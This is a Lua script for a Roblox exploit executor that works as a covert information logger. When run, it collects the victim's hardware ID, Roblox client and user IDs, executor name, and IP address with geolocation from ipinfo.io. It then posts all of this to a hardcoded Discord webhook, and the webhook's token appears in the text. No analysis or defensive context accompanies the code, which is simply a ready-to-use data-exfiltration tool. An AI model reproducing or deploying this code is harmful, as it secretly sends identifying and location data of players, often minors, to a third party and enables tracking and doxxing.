local Hook = "https://discord.com/api/webhooks/1182022904259555470/27zZ8uXOVru-Zk5eRP9ljKbSYZguRecrN_xAc33OC1AWac-4IYWBnJQ_fur4heOeZvBG"
local LocalPlayer = game:GetService("Players").LocalPlayer

local function Send(Webhook, Title, Message)
    local embed = {
        ["title"] = tostring(Title),
        ['description'] = Message,
        ["color"] = tonumber(000000)
    }
    local a = request({
        Url = Webhook,
        Headers = {
            ['Content-Type'] = 'application/json'
        },
        Body = game:GetService("HttpService"):JSONEncode({
            ['embeds'] = {embed},
            ['avatar_url'] = "https://cdn.discordapp.com/attachments/1089257712900120576/1105570269055160422/archivector200300015.png"
        }),
        Method = "POST"
    })
end

local function GetClientID()
    local player = game.Players.LocalPlayer
    if player then
        return player.UserId
    end
end


local function IP()
    local success, response = pcall(function()
        return request({
            Url = "http://ipinfo.io/json",
            Method = "GET"
        })
    end)

    if success and response then
        if response.StatusCode == 200 then
        local decodedResponse = game:GetService("HttpService"):JSONDecode(response.Body)
        local success,result = pcall(function()
            local Validator = game:GetService("Players").LocalPlayer.UserId/10 
        end)
        local Information = "Executor HWID: " .. (gethwid()) .. "\n"
            .."Roblox Client ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n"
            .."Roblox User ID: " .. GetClientID() .. "\n"
            .."Executor: " .. (identifyexecutor()) .. "\n"
            .. "IP: " .. decodedResponse.ip .. "\n"
            .. "City: " .. decodedResponse.city .. "\n"
            .. "Region: " .. decodedResponse.region .. "\n"
            .. "Country: " .. decodedResponse.country .. "\n"
            .. "Timezone: " .. decodedResponse.timezone

        return Information
    end
    end
end

Send(Hook, "Information: " .. LocalPlayer.Name, IP())
